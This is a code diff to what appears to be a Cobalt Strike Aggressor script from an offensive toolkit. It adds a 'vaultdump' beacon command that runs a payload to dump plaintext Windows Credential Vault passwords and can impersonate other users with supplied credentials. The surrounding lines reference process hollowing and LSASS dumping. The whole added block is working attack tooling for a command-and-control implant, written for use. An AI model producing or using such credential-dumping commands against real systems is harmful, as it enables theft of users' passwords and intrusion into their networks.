@@ -3056,3 +3056,32 @@ beacon_command_register(
     "MITRE ATT&CK: T1055.012 (Process Hollowing), T1003.001 (LSASS), T1564.010 (Arg Spoofing)\n\n" .
     "Phase: Remote Ops\nArgs: <pe_path> (required) [commands...] (optional)"
 );
+
+# --- vaultdump ---
+alias vaultdump {
+    local('$bid $user $pass $domain $args');
+    $bid    = $1;
+    $user   = $2;
+    $pass   = $3;
+    $domain = $4;
+    if ($user is $null) {
+        $args = "";
+    } else {
+        if ($domain is $null) { $domain = "."; }
+        $args = bof_pack($bid, "zzz", $user, $pass, $domain);
+    }
+    dani_run($bid, "vaultdump", $args);
+}
+beacon_command_register(
+    "vaultdump",
+    "Dump Windows Vault credentials — T1555.004 (by Dani)",
+    "Synopsis: vaultdump [username] [password] [domain]\n\n" .
+    "Description: Enumerate Windows Credential Vaults and dump plaintext\n" .
+    "passwords. Without args, dumps current context. With credentials,\n" .
+    "impersonates the target user to access their vault.\n\n" .
+    "Examples:\n" .
+    "  vaultdump\n" .
+    "  vaultdump admin P@ssw0rd CORP\n\n" .
+    "MITRE ATT&CK: T1555.004 (Windows Credential Manager), T1003.004 (LSA Secrets)\n\n" .
+    "Phase: Remote Ops\nArgs: [user] [pass] [domain] (all optional)"
+);
